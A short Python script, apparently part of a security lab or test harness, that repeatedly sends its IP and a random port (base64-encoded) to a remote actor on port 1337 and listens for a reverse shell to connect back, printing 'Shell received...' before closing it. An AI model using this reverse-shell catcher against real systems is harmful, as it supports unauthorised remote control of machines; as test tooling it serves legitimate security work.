import base64
import os
import random
import socket
import threading
import time

OWN_IP = os.environ['OWN_IP']
TCP_IP = os.environ['ACTOR_IP']


def getShell(ip, port):
    sock = socket.socket()
    sock.bind((ip, port))
    sock.listen(3)
    conn = sock.accept()
    print("Shell received...", flush=True)
    sock.shutdown(socket.SHUT_RDWR)
    sock.close()


while True:
    try:
        TCP_PORT = random.randint(31337, 40000)
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((TCP_IP, 1337))
        thread = threading.Thread(target=getShell, args=(OWN_IP, TCP_PORT))
        thread.daemon = True
        thread.start()
        s.send(base64.b64encode(OWN_IP.encode())+b'\n')
        s.send(base64.b64encode(str(TCP_PORT).encode())+b'\n')
        print("sent netinfo...", flush=True)
        time.sleep(2)
        s.close()
        time.sleep(10)
    except:
        pass
